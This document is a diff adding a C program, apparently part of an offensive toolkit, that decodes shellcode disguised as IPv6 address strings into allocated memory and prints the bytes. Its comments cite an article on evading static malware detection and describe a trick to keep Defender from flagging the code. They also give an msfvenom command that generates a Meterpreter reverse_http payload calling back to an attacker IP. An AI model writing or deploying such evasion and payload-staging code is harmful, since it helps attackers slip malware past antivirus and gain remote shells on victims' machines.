@@ -1,0 +1,83 @@
+#include <Windows.h>
+#include <stdio.h>
+#include <ntstatus.h>
+#include <Ip2string.h>
+#pragma comment(lib, "Ntdll.lib")
+
+// read array of shellcode formatted as IPv4 addresses
+// https://gitlab.com/ORCA000/hellshell/-/blob/main/IPv4Fuscation/Ipv4Fuscation.cpp
+// https://infosecwriteups.com/the-art-of-obfuscation-evading-static-malware-detection-f4663ae4716f
+
+// compile: 
+//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2ipv6.c /link /OUT:bin2ipv6.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
+
+// Define our ustring struct
+struct ustring {
+	DWORD Length;
+	DWORD MaximumLength;
+	PUCHAR Buffer;
+} _data, key;
+
+int DecodeIPv6Fuscation(const char* IPV6[], void * LpBaseAddress, int arrSize) {
+	PCSTR Terminator = NULL;
+	void * LpBaseAddress2 = NULL;
+	NTSTATUS STATUS;
+	int i = 0;
+	for (int j = 0; j < arrSize; j++) {
+		LpBaseAddress2 = ((ULONG_PTR)LpBaseAddress + i);
+		if (RtlIpv6StringToAddressA((PCSTR)IPV6[j], &Terminator, LpBaseAddress2) != STATUS_SUCCESS) {
+			printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV6[j], STATUS);
+			return 1;
+		}
+		else {
+			i = i + 16;
+		}
+		
+		// Defender will detect this function if we don't print or write something out
+		FILE* outfile = fopen("nul", "w");
+		fputs("out", outfile);
+		fclose(outfile);
+
+	}
+	return 0;
+}
+
+int main(void) {
+	// Shellcode as array of IP Addresses
+	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
+	// python3 bin2ip.py -v 6 -i met.bin
+	 ###IP### 
+
+	// declare a variable for our shellcode size
+ 	unsigned int shellcode_size = (sizeof(IPv6s) / sizeof(IPv6s[0])) * 16;
+	
+	printf("array size: %d\n", (sizeof(IPv6s) / sizeof(IPv6s[0])) * 16);
+	
+	// Declare a buffer for storing our shellcode
+	PVOID buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	
+	// Decode IPs and copy into memory
+	if (DecodeIPv6Fuscation(&IPv6s, buffer, sizeof(IPv6s) / sizeof(IPv6s[0])) != 0) {
+		return -1;
+	}
+
+	// create a new struct from the buffer we allocated
+	_data.Buffer = buffer;
+	_data.Length = shellcode_size;
+	
+	int idx = 0;
+	while ( idx < _data.Length)
+	{
+		if (idx == (shellcode_size - 1) )
+		{
+			printf("0x%02x ", _data.Buffer[idx]);
+		}
+		else
+		{
+			printf("0x%02x, ", _data.Buffer[idx]);
+		}
+		idx++;
+	}
+
+    return 0;
+}
